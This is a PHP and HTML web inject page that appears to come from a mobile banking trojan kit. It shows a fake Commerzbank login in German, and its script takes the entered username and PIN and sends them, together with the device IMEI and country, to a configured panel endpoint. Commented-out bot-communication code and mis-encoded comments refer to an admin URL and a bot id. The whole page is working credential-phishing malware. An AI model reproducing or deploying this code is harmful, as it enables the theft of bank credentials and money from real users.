<html>
<head>
<style>

body {
	margin: 0;
	padding: 0;
	background: #ffcc33;
    font-family: sans-serif;
}

	.input {
		font-size: 20px;
	    line-height: 18px;
	    -webkit-transition: border-color linear .2s,box-shadow linear .2s;
	    -moz-transition: border-color linear .2s,box-shadow linear .2s;
	    -o-transition: border-color linear .2s,box-shadow linear .2s;
	    transition: border-color linear .2s,box-shadow linear .2s;
	    color: #000;
	    padding: 5px 16px;
	    border: 0;
	    border-bottom: 1px solid #000;
	    background-color: transparent;
	    height: 32px;
	    text-align: center;
	    display: block;
	    margin: 8px 0 0 0;
	    vertical-align: middle;
	    width: 95%;
	}
		::-webkit-input-placeholder {color:#000;font-weight: bold;text-align: center;}
		::-moz-placeholder          {color:#000;font-weight: bold;text-align: center;}/* Firefox 19+ */
		:-moz-placeholder           {color:#000;font-weight: bold;text-align: center;}/* Firefox 18- */
		:-ms-input-placeholder      {color:#000;font-weight: bold;text-align: center;}
	
	
	.fielderror {
		font-size: 20px;
	    line-height: 18px;
	    -webkit-transition: border-color linear .2s,box-shadow linear .2s;
	    -moz-transition: border-color linear .2s,box-shadow linear .2s;
	    -o-transition: border-color linear .2s,box-shadow linear .2s;
	    transition: border-color linear .2s,box-shadow linear .2s;
	    color: #000;
	    padding: 5px 16px;
	    border: 0;
	    border-bottom: 1px solid #f00;
	    background-color: transparent;
	    height: 32px;
	    text-align: center;
	    display: block;
	    margin: 8px 0 0 0;
	    vertical-align: middle;
	    width: 95%;
	}
	
	.submit {
	color: #fff;
    background-color: #000;
	font-size: 12px;
    padding: 7px 16px;
	    display: inline-block;
    font-family: Verdana,Arial,sans-serif;
    font-size: 14px;
    font-weight: bold;
    line-height: 18px;
    text-align: left;
    text-decoration: none;
    vertical-align: top;
    cursor: pointer;
    border: 0;
    -webkit-box-shadow: 0 2px 2px rgba(0,0,0,0.4);
    box-shadow: 0 2px 2px rgba(0,0,0,0.4) float: right;
    margin-bottom: 10px;
	}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
<div id="content_div">
<center>
<h1>Bittle anmelden</h1>

<form action="null" method="post" id="_mainForm" target="flow_handler">
<center>
<input name="Benutzername" id="login" placeholder="Benutzername" maxlength="20" class="input" type="text">

<input name="PIN" id="password" placeholder="PIN" maxlength="50" class="input" type="password"><br>

<input value="Mobile Banking anmelden" id="input_submitBtn" class="submit" type="button">
<input type="hidden" name="name" value="Commerzbank">

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</center>
</form>
           <script type="text/javascript">
               
                
                
                (function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
                        input.value = sV;
                        objForm.appendChild(input);
                    };


                    /*var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
                    
                    if(!/https?:\/\//i.test(g_sFAct))
                       g_sFAct = 'http://' + g_sFAct;
                    
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
                    try{
                       g_oForm.action = g_sFAct;
                    } catch(e){};
                    
                    var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
                    
                        var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

                        try{
                            oNumInp.className = oCodeInp.className = 'input';
                        } catch(e){};
                        
                        if (oNumInp.value.length < 6) {
                            try{
                                oNumInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }
                        
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                            try{
                                oCodeInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }
                top['closeDlg'] = true;
                /*prompt('send', '{"dialog id" : "commerzbank'+
                    '", "benutzername": "'+oNumInp.value+
                    '", "pin": "'+oCodeInp.value+'"}');
                        
                        document.getElementById('content_div').style.visibility = 'hidden';
                        g_oForm.submit();*/
						
						
						
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|commerzbank|"+oNumInp.value+"|"+oCodeInp.value+"|");
                        
                        return false;
                    };

                })();
            </script>
</center>
</div>
</body>
</html>
